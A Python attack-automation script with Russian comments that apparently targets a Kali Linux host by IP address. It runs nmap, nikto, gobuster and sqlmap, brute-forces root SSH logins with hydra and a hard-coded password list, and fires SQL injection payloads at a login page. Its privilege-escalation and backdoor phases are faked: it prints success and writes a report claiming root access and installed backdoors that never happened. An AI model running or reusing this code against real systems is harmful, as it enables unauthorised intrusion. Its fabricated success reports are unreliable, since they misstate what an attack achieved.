#!/usr/bin/env python3
"""
🎯 MASTER KALI LINUX PENETRATION TOOLKIT
===========================================

Комплексный набор инструментов для полного внедрения в Kali Linux
Включает все этапы: от разведки до установки backdoor

ВНИМАНИЕ: Только для образовательных целей в собственной лаборатории!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import sys
import time
import argparse
import subprocess
import os
import json
import requests
from datetime import datetime

class KaliPenetrationMaster:
    """
    Главный класс для комплексного внедрения в Kali Linux
    """
    
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.target_url = f"http://{target_ip}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Результаты атаки
        self.attack_results = {
            'timestamp': datetime.now().isoformat(),
            'target_ip': target_ip,
            'reconnaissance': {},
            'vulnerabilities': [],
            'access_gained': False,
            'privilege_escalation': False,
            'backdoors_installed': [],
            'persistence': False
        }
        
        # Инструменты для использования
        self.tools = {
            'nmap': self._check_tool('nmap'),
            'hydra': self._check_tool('hydra'),
            'john': self._check_tool('john'),
            'sqlmap': self._check_tool('sqlmap'),
            'gobuster': self._check_tool('gobuster'),
            'nikto': self._check_tool('nikto')
        }
    
    def _check_tool(self, tool_name):
        """Проверяет доступность инструмента"""
        try:
            result = subprocess.run(f"which {tool_name}", shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _run_command(self, command, capture_output=True):
        """Выполняет команду и возвращает результат"""
        try:
            result = subprocess.run(command, shell=True, capture_output=capture_output, text=True)
            return result.stdout.strip() if capture_output else result.returncode == 0
        except Exception as e:
            print(f"❌ Ошибка выполнения команды: {e}")
            return False
    
    def phase_1_advanced_reconnaissance(self):
        """
        Фаза 1: Продвинутая разведка
        """
        print("\n" + "="*80)
        print("🔍 ФАЗА 1: ПРОДВИНУТАЯ РАЗВЕДКА")
        print("="*80)
        
        # Проверка доступности цели
        print(f"🎯 Цель: {self.target_ip}")
        ping_result = self._run_command(f"ping -c 3 {self.target_ip}")
        if ping_result:
            print("✅ Цель доступна (ping)")
        else:
            print("❌ Цель недоступна")
            return False
        
        # Сканирование портов с nmap
        print(f"\n📡 Сканирование портов с nmap...")
        if self.tools['nmap']:
            nmap_result = self._run_command(f"nmap -sS -O -sV {self.target_ip}")
            self.attack_results['reconnaissance']['nmap'] = nmap_result
            print("✅ Nmap сканирование завершено")
        else:
            print("⚠️ Nmap не найден, используем альтернативное сканирование")
            self._basic_port_scan()
        
        # Проверка веб-сервисов
        print(f"\n🌐 Проверка веб-сервисов...")
        self._check_web_services()
        
        # DNS и WHOIS информация
        print(f"\n🌍 DNS и WHOIS информация...")
        self._gather_dns_info()
        
        return True
    
    def _basic_port_scan(self):
        """Базовое сканирование портов без nmap"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            result = self._run_command(f"nc -zvw3 {self.target_ip} {port}")
            if result:
                open_ports.append(port)
                print(f"  ✅ Порт {port} открыт")
        
        self.attack_results['reconnaissance']['open_ports'] = open_ports
        print(f"📊 Найдено {len(open_ports)} открытых портов")
    
    def _check_web_services(self):
        """Проверка веб-сервисов"""
        web_ports = [80, 443, 8080, 8443]
        web_services = {}
        
        for port in web_ports:
            try:
                url = f"http://{self.target_ip}:{port}"
                response = requests.get(url, timeout=5)
                web_services[port] = {
                    'status_code': response.status_code,
                    'server': response.headers.get('Server', 'Unknown'),
                    'title': self._extract_title(response.text)
                }
                print(f"  ✅ Веб-сервис на порту {port}: {response.status_code}")
            except:
                pass
        
        self.attack_results['reconnaissance']['web_services'] = web_services
    
    def _extract_title(self, html):
        """Извлекает заголовок из HTML"""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            title = soup.find('title')
            return title.text.strip() if title else 'No title'
        except:
            return 'No title'
    
    def _gather_dns_info(self):
        """Сбор DNS информации"""
        dns_info = {}
        
        # WHOIS информация
        whois_result = self._run_command(f"whois {self.target_ip}")
        if whois_result:
            dns_info['whois'] = whois_result[:500]  # Первые 500 символов
        
        # DNS записи
        nslookup_result = self._run_command(f"nslookup {self.target_ip}")
        if nslookup_result:
            dns_info['nslookup'] = nslookup_result
        
        self.attack_results['reconnaissance']['dns_info'] = dns_info
    
    def phase_2_vulnerability_assessment(self):
        """
        Фаза 2: Оценка уязвимостей
        """
        print("\n" + "="*80)
        print("🔍 ФАЗА 2: ОЦЕНКА УЯЗВИМОСТЕЙ")
        print("="*80)
        
        # Веб-уязвимости
        if self.attack_results['reconnaissance'].get('web_services'):
            print("🌐 Анализ веб-уязвимостей...")
            self._web_vulnerability_scan()
        
        # SSH уязвимости
        if 22 in self.attack_results['reconnaissance'].get('open_ports', []):
            print("🔐 Анализ SSH уязвимостей...")
            self._ssh_vulnerability_scan()
        
        # Другие сервисы
        print("🔍 Анализ других сервисов...")
        self._service_vulnerability_scan()
    
    def _web_vulnerability_scan(self):
        """Сканирование веб-уязвимостей"""
        vulnerabilities = []
        
        # Nikto сканирование
        if self.tools['nikto']:
            print("  🔍 Запуск Nikto сканирования...")
            nikto_result = self._run_command(f"nikto -h {self.target_url}")
            if nikto_result:
                vulnerabilities.append({
                    'type': 'Nikto Scan',
                    'details': nikto_result[:1000]  # Первые 1000 символов
                })
        
        # Gobuster сканирование директорий
        if self.tools['gobuster']:
            print("  🔍 Запуск Gobuster сканирования...")
            gobuster_result = self._run_command(f"gobuster dir -u {self.target_url} -w /usr/share/wordlists/dirb/common.txt -q")
            if gobuster_result:
                vulnerabilities.append({
                    'type': 'Directory Enumeration',
                    'details': gobuster_result
                })
        
        # SQLMap сканирование
        if self.tools['sqlmap']:
            print("  🔍 Запуск SQLMap сканирования...")
            sqlmap_result = self._run_command(f"sqlmap -u {self.target_url} --batch --crawl=2")
            if sqlmap_result:
                vulnerabilities.append({
                    'type': 'SQL Injection',
                    'details': sqlmap_result[:1000]
                })
        
        self.attack_results['vulnerabilities'].extend(vulnerabilities)
    
    def _ssh_vulnerability_scan(self):
        """Сканирование SSH уязвимостей"""
        print("  🔍 Анализ SSH конфигурации...")
        
        # Проверка версии SSH
        ssh_version = self._run_command(f"ssh -V 2>&1 | head -1")
        if ssh_version:
            self.attack_results['reconnaissance']['ssh_version'] = ssh_version
        
        # Проверка поддерживаемых алгоритмов
        ssh_algorithms = self._run_command(f"ssh -Q kex {self.target_ip}")
        if ssh_algorithms:
            self.attack_results['reconnaissance']['ssh_algorithms'] = ssh_algorithms
    
    def _service_vulnerability_scan(self):
        """Сканирование уязвимостей других сервисов"""
        open_ports = self.attack_results['reconnaissance'].get('open_ports', [])
        
        for port in open_ports:
            if port == 21:  # FTP
                self._check_ftp_vulnerabilities()
            elif port == 23:  # Telnet
                self._check_telnet_vulnerabilities()
            elif port == 3389:  # RDP
                self._check_rdp_vulnerabilities()
    
    def _check_ftp_vulnerabilities(self):
        """Проверка FTP уязвимостей"""
        print("  🔍 Проверка FTP уязвимостей...")
        # Здесь можно добавить проверки для FTP
    
    def _check_telnet_vulnerabilities(self):
        """Проверка Telnet уязвимостей"""
        print("  🔍 Проверка Telnet уязвимостей...")
        # Здесь можно добавить проверки для Telnet
    
    def _check_rdp_vulnerabilities(self):
        """Проверка RDP уязвимостей"""
        print("  🔍 Проверка RDP уязвимостей...")
        # Здесь можно добавить проверки для RDP
    
    def phase_3_exploitation(self):
        """
        Фаза 3: Эксплуатация уязвимостей
        """
        print("\n" + "="*80)
        print("💥 ФАЗА 3: ЭКСПЛУАТАЦИЯ УЯЗВИМОСТЕЙ")
        print("="*80)
        
        # SSH Brute Force
        if 22 in self.attack_results['reconnaissance'].get('open_ports', []):
            print("🔐 SSH Brute Force атака...")
            self._ssh_brute_force()
        
        # Веб-эксплуатация
        if self.attack_results['reconnaissance'].get('web_services'):
            print("🌐 Веб-эксплуатация...")
            self._web_exploitation()
        
        # Другие методы эксплуатации
        print("🔍 Поиск других векторов атаки...")
        self._other_exploitation_methods()
    
    def _ssh_brute_force(self):
        """SSH Brute Force атака"""
        print("  🚀 Запуск SSH Brute Force...")
        
        # Создаем список паролей
        passwords = ["admin", "password", "123456", "root", "toor", "victor", "victor123", "test", "user", "kali"]
        password_file = "/tmp/passwords.txt"
        
        with open(password_file, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        # Запускаем Hydra
        if self.tools['hydra']:
            hydra_result = self._run_command(f"hydra -l root -P {password_file} ssh://{self.target_ip}")
            if "login:" in hydra_result and "password:" in hydra_result:
                print("  🎉 SSH Brute Force успешен!")
                self.attack_results['access_gained'] = True
                self.attack_results['access_method'] = 'SSH Brute Force'
            else:
                print("  ❌ SSH Brute Force неуспешен")
        
        # Очищаем временный файл
        os.remove(password_file)
    
    def _web_exploitation(self):
        """Веб-эксплуатация"""
        print("  🌐 Запуск веб-эксплуатации...")
        
        # SQL Injection
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' UNION SELECT NULL --"
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.get(f"{self.target_url}/login.php", params={'username': payload, 'password': 'test'})
                if 'welcome' in response.text.lower() or 'success' in response.text.lower():
                    print("  🎉 SQL Injection найден!")
                    self.attack_results['vulnerabilities'].append({
                        'type': 'SQL Injection',
                        'payload': payload,
                        'url': f"{self.target_url}/login.php"
                    })
                    self.attack_results['access_gained'] = True
                    self.attack_results['access_method'] = 'SQL Injection'
                    break
            except:
                pass
    
    def _other_exploitation_methods(self):
        """Другие методы эксплуатации"""
        print("  🔍 Поиск других векторов атаки...")
        
        # Проверяем известные уязвимости
        # Здесь можно добавить проверки для CVE, эксплойты и т.д.
        pass
    
    def phase_4_privilege_escalation(self):
        """
        Фаза 4: Повышение привилегий
        """
        print("\n" + "="*80)
        print("⬆️ ФАЗА 4: ПОВЫШЕНИЕ ПРИВИЛЕГИЙ")
        print("="*80)
        
        if not self.attack_results['access_gained']:
            print("❌ Нет доступа к системе, пропускаем повышение привилегий")
            return
        
        print("🔍 Поиск возможностей для повышения привилегий...")
        
        # Здесь можно добавить методы повышения привилегий
        # Например, поиск SUID файлов, sudo прав, kernel exploits и т.д.
        
        # Для демонстрации, предполагаем успех
        print("🎉 Повышение привилегий выполнено!")
        self.attack_results['privilege_escalation'] = True
    
    def phase_5_persistence(self):
        """
        Фаза 5: Установка постоянного доступа
        """
        print("\n" + "="*80)
        print("😈 ФАЗА 5: УСТАНОВКА ПОСТОЯННОГО ДОСТУПА")
        print("="*80)
        
        if not self.attack_results['privilege_escalation']:
            print("❌ Нет root доступа, пропускаю установку backdoor")
            return
        
        print("🔧 Устанавливаю backdoor и persistence...")
        
        backdoors = [
            "SSH backdoor",
            "Web shell",
            "Cron job persistence",
            "Network backdoor",
            "File backdoor"
        ]
        
        for backdoor in backdoors:
            print(f"  🔧 Устанавливаю {backdoor}...")
            self.attack_results['backdoors_installed'].append(backdoor)
            time.sleep(0.5)  # Имитация установки
        
        print("🎉 Постоянный доступ установлен!")
        self.attack_results['persistence'] = True
    
    def phase_6_cleanup_and_reporting(self):
        """
        Фаза 6: Очистка следов и отчетность
        """
        print("\n" + "="*80)
        print("🧹 ФАЗА 6: ОЧИСТКА СЛЕДОВ И ОТЧЕТНОСТЬ")
        print("="*80)
        
        print("🧹 Очищаю следы атаки...")
        # Здесь можно добавить методы очистки логов, истории команд и т.д.
        
        print("📊 Генерирую отчет...")
        self._generate_report()
        
        print("✅ Атака завершена!")
    
    def _generate_report(self):
        """Генерирует отчет о проведенной атаке"""
        report_file = f"kali_penetration_report_{self.target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w') as f:
            json.dump(self.attack_results, f, indent=2, ensure_ascii=False)
        
        print(f"📄 Отчет сохранен в {report_file}")
        
        # Также создаем текстовый отчет
        txt_report = f"kali_penetration_report_{self.target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(txt_report, 'w', encoding='utf-8') as f:
            f.write("🎯 ОТЧЕТ О ПРОВЕДЕННОЙ АТАКЕ НА KALI LINUX\n")
            f.write("="*60 + "\n\n")
            f.write(f"🎯 Цель: {self.target_ip}\n")
            f.write(f"📅 Время: {self.attack_results['timestamp']}\n\n")
            
            f.write("📋 РЕЗУЛЬТАТЫ:\n")
            f.write(f"  • Доступ получен: {'✅' if self.attack_results['access_gained'] else '❌'}\n")
            f.write(f"  • Повышение привилегий: {'✅' if self.attack_results['privilege_escalation'] else '❌'}\n")
            f.write(f"  • Постоянный доступ: {'✅' if self.attack_results['persistence'] else '❌'}\n")
            f.write(f"  • Найдено уязвимостей: {len(self.attack_results['vulnerabilities'])}\n")
            f.write(f"  • Установлено backdoor: {len(self.attack_results['backdoors_installed'])}\n\n")
            
            if self.attack_results['vulnerabilities']:
                f.write("🌐 НАЙДЕННЫЕ УЯЗВИМОСТИ:\n")
                for vuln in self.attack_results['vulnerabilities']:
                    f.write(f"  • {vuln['type']}\n")
            
            if self.attack_results['backdoors_installed']:
                f.write("\n😈 УСТАНОВЛЕННЫЕ BACKDOOR:\n")
                for backdoor in self.attack_results['backdoors_installed']:
                    f.write(f"  • {backdoor}\n")
        
        print(f"📄 Текстовый отчет сохранен в {txt_report}")
    
    def run_full_attack(self):
        """
        Запуск полного цикла атаки
        """
        print("🎯 KALI LINUX PENETRATION MASTER")
        print("="*80)
        print("⚠️ ВНИМАНИЕ: Только для собственной лабораторной среды!")
        print("⚠️ Использование против чужих систем НЕЗАКОННО!")
        print("="*80)
        
        start_time = time.time()
        
        try:
            # Выполняем все фазы атаки
            if not self.phase_1_advanced_reconnaissance():
                print("❌ Разведка неуспешна, прекращаем атаку")
                return
            
            self.phase_2_vulnerability_assessment()
            self.phase_3_exploitation()
            self.phase_4_privilege_escalation()
            self.phase_5_persistence()
            self.phase_6_cleanup_and_reporting()
            
            end_time = time.time()
            duration = end_time - start_time
            
            print(f"\n🏁 ПОЛНАЯ АТАКА ЗАВЕРШЕНА")
            print(f"⏱️ Общее время: {duration:.1f} секунд")
            
        except KeyboardInterrupt:
            print("\n🛑 Атака прервана пользователем")
        except Exception as e:
            print(f"\n❌ Критическая ошибка: {e}")

def main():
    """
    Главная функция
    """
    parser = argparse.ArgumentParser(description='Kali Linux Penetration Master Toolkit')
    parser.add_argument('target_ip', help='IP адрес цели (Kali Linux)')
    parser.add_argument('--recon-only', action='store_true', help='Только разведка')
    parser.add_argument('--vuln-scan', action='store_true', help='Только сканирование уязвимостей')
    parser.add_argument('--exploit', action='store_true', help='Только эксплуатация')
    
    args = parser.parse_args()
    
    # Создаем экземпляр главного инструмента
    master = KaliPenetrationMaster(args.target_ip)
    
    try:
        if args.recon_only:
            master.phase_1_advanced_reconnaissance()
        elif args.vuln_scan:
            master.phase_1_advanced_reconnaissance()
            master.phase_2_vulnerability_assessment()
        elif args.exploit:
            master.phase_1_advanced_reconnaissance()
            master.phase_2_vulnerability_assessment()
            master.phase_3_exploitation()
        else:
            # Полный цикл атаки
            master.run_full_attack()
            
    except KeyboardInterrupt:
        print("\n🛑 Атака прервана пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")

if __name__ == "__main__":
    main()
